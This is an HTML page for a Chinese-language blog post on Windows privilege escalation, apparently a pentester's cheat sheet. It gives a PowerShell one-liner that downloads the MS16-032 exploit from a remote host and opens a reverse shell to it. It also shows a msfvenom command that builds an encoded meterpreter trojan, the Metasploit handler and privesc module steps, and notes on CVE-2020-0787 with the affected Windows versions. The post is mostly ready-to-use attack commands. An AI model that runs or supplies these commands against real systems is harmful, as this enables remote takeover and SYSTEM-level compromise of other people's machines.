@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>windows提权 | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段） 本地溢出漏洞提权 数据库提权 第三⽅软件提权 MS16-032 提权 影响版本 Windows Vista Windows 7 Windows 8.1 Windows 10 Windows 2008 Server 直接运行提权exe">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/98/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/98/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="windows提权" />
+<meta property="og:description" content="⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段） 本地溢出漏洞提权 数据库提权 第三⽅软件提权 MS16-032 提权 影响版本 Windows Vista Windows 7 Windows 8.1 Windows 10 Windows 2008 Server 直接运行提权exe" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/98/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-11T06:38:53+00:00" />
+<meta property="article:modified_time" content="2022-01-11T06:38:53+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="windows提权"/>
+<meta name="twitter:description" content="⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段） 本地溢出漏洞提权 数据库提权 第三⽅软件提权 MS16-032 提权 影响版本 Windows Vista Windows 7 Windows 8.1 Windows 10 Windows 2008 Server 直接运行提权exe"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "windows提权",
+      "item": "https://a10nggg.github.io/archives/98/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "windows提权",
+  "name": "windows提权",
+  "description": "⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段） 本地溢出漏洞提权 数据库提权 第三⽅软件提权 MS16-032 提权 影响版本 Windows Vista Windows 7 Windows 8.1 Windows 10 Windows 2008 Server 直接运行提权exe",
+  "keywords": [
+    
+  ],
+  "articleBody": "⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段） 本地溢出漏洞提权 数据库提权 第三⽅软件提权 MS16-032 提权\n影响版本\nWindows Vista\nWindows 7\nWindows 8.1\nWindows 10\nWindows 2008 Server\n直接运行提权exe就会得到一个新的shell，\n{.wp-editor-md-post-content-link}\nIEX (New-Object Net.WebClient).DownloadString('http://192.168.224.132:8000/ms16_032_intrd_mod.ps1');Invoke-MS16-032\"-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://192.168.224.132:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.224.132 -Port 445\"\nmsf 1.利用msfvenom生成木马\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 13 -b '\\x00\\xfff\\x0a' lhost=10.10.10.128 --platform windows lport=443 -f exe \u003e/root/test.exe\n2.在msf下开启监听\nuse exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.10.128 set lport 443 exploit 3.获取session后放置后台background\nuse ms16_032_secondary_logon_handle_privesc\nset session 1\nexploit\n本地提权 CVE-2020-0787\nPOC成功会弹出SYSTEM权限CMD不适用于WebShell,几乎秒杀了所有的win机器。我在32机器是失败了，\nWindows 10 Version 1809 for ARM64-based Systems Windows Server 2008 for 32-bit Systems Service Pack 2 Windows RT 8.1 Windows 8.1 for x64-based systems Windows 8.1 for 32-bit systems Windows 7 for x64-based Systems Service Pack 1 Windows 7 for 32-bit Systems Service Pack 1 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 for 32-bit Systems Windows Server, version 1903 (Server Core installation) Windows 10 Version 1903 for ARM64-based Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1709 for ARM64-based Systems Windows 10 Version 1709 for x64-based Systems Windows 10 Version 1709 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows Server, version 1803 (Server Core Installation) Windows 10 Version 1803 for x64-based Systems Windows 10 Version 1803 for 32-bit Systems ⾸先我们需要查找⽬标机器上有没有打补丁 KB4540673 ：\nsysteminfo| findstr KB4540673\n{.wp-editor-md-post-content-link}\n检查可利用漏洞 Windows-Exploit-Suggester python2 windows-exploit-suggester.py --database 2021-11-01-mssb.xls --systeminfo systeminfo.txt\n在线Windows提权辅助工具 https://i.hacking8.com/tiquan\n",
+  "wordCount" : "586",
+  "inLanguage": "en",
+  "datePublished": "2022-01-11T06:38:53Z",
+  "dateModified": "2022-01-11T06:38:53Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/98/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      windows提权
+    </h1>
+    <div class="post-meta"><span title='2022-01-11 06:38:53 +0000 +0000'>January 11, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="般常的提权法有当然还有很多提权段">⼀般常⻅的提权⽅法有：（当然还有很多提权⼿段）<a hidden class="anchor" aria-hidden="true" href="#般常的提权法有当然还有很多提权段">#</a></h1>
+<ol>
+<li>本地溢出漏洞提权</li>
+<li>数据库提权</li>
+<li>第三⽅软件提权</li>
+</ol>
+<p>MS16-032 提权<br>
+影响版本<br>
+Windows Vista<br>
+Windows 7<br>
+Windows 8.1<br>
+Windows 10<br>
+Windows 2008 Server</p>
+<p>直接运行提权exe就会得到一个新的shell，<br>
+<a href="/uploads/2022/01/wp_editor_md_08e18a5f113f33a39e1a05f5a5e9ecf5.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_08e18a5f113f33a39e1a05f5a5e9ecf5.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p><code>IEX (New-Object Net.WebClient).DownloadString('http://192.168.224.132:8000/ms16_032_intrd_mod.ps1');Invoke-MS16-032&quot;-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://192.168.224.132:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.224.132 -Port 445&quot;</code></p>
+<h1 id="msf">msf<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h1>
+<p>1.利用msfvenom生成木马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 13 -b '\x00\xfff\x0a' lhost=10.10.10.128 --platform windows lport=443 -f exe &gt;/root/test.exe</code></p>
+<p>2.在msf下开启监听</p>
+<pre><code class="line-numbers">use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost 10.10.10.128
+
+set lport 443
+
+exploit
+</code></pre>
+<p>3.获取session后放置后台background</p>
+<ol start="4">
+<li></li>
+</ol>
+<p><code>use ms16_032_secondary_logon_handle_privesc</code></p>
+<ol start="5">
+<li></li>
+</ol>
+<p><code>set session 1</code></p>
+<ol start="6">
+<li></li>
+</ol>
+<p><code>exploit</code></p>
+<h1 id="本地提权">本地提权<a hidden class="anchor" aria-hidden="true" href="#本地提权">#</a></h1>
+<p>CVE-2020-0787<br>
+POC成功会弹出SYSTEM权限CMD不适用于WebShell,几乎秒杀了所有的win机器。我在32机器是失败了，</p>
+<pre><code class="line-numbers">Windows 10 Version 1809 for ARM64-based Systems
+Windows Server 2008 for 32-bit Systems Service Pack 2
+Windows RT 8.1
+Windows 8.1 for x64-based systems
+Windows 8.1 for 32-bit systems
+Windows 7 for x64-based Systems Service Pack 1
+Windows 7 for 32-bit Systems Service Pack 1
+Windows Server 2016 (Server Core installation)
+Windows Server 2016
+Windows 10 Version 1607 for x64-based Systems
+Windows 10 Version 1607 for 32-bit Systems
+Windows 10 for x64-based Systems
+Windows 10 for 32-bit Systems
+Windows Server, version 1903 (Server Core installation)
+Windows 10 Version 1903 for ARM64-based Systems
+Windows 10 Version 1903 for x64-based Systems
+Windows 10 Version 1903 for 32-bit Systems
+Windows 10 Version 1709 for ARM64-based Systems
+Windows 10 Version 1709 for x64-based Systems
+Windows 10 Version 1709 for 32-bit Systems
+Windows Server, version 1909 (Server Core installation)
+Windows 10 Version 1909 for ARM64-based Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for 32-bit Systems
+Windows Server 2019 (Server Core installation)
+Windows Server 2019
+Windows Server 2012 R2 (Server Core installation)
+Windows Server 2012 R2
+Windows Server 2012 (Server Core installation)
+Windows Server 2012
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
+Windows Server 2008 R2 for x64-based Systems Service Pack 1
+Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
+Windows Server 2008 for x64-based Systems Service Pack 2
+Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
+Windows 10 Version 1809 for x64-based Systems
+Windows 10 Version 1809 for 32-bit Systems
+Windows 10 Version 1803 for ARM64-based Systems
+Windows Server, version 1803 (Server Core Installation)
+Windows 10 Version 1803 for x64-based Systems
+Windows 10 Version 1803 for 32-bit Systems
+</code></pre>
+<p>⾸先我们需要查找⽬标机器上有没有打补丁 KB4540673 ：<br>
+<code>systeminfo| findstr KB4540673</code><br>
+<a href="/uploads/2022/01/wp_editor_md_ea7cbd7fdc1395d0918e17f49c234d23.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_ea7cbd7fdc1395d0918e17f49c234d23.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h3 id="检查可利用漏洞-windows-exploit-suggester">检查可利用漏洞 Windows-Exploit-Suggester<a hidden class="anchor" aria-hidden="true" href="#检查可利用漏洞-windows-exploit-suggester">#</a></h3>
+<p><code>python2 windows-exploit-suggester.py --database 2021-11-01-mssb.xls --systeminfo  systeminfo.txt</code></p>
+<h3 id="在线windows提权辅助工具">在线Windows提权辅助工具<a hidden class="anchor" aria-hidden="true" href="#在线windows提权辅助工具">#</a></h3>
+<p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
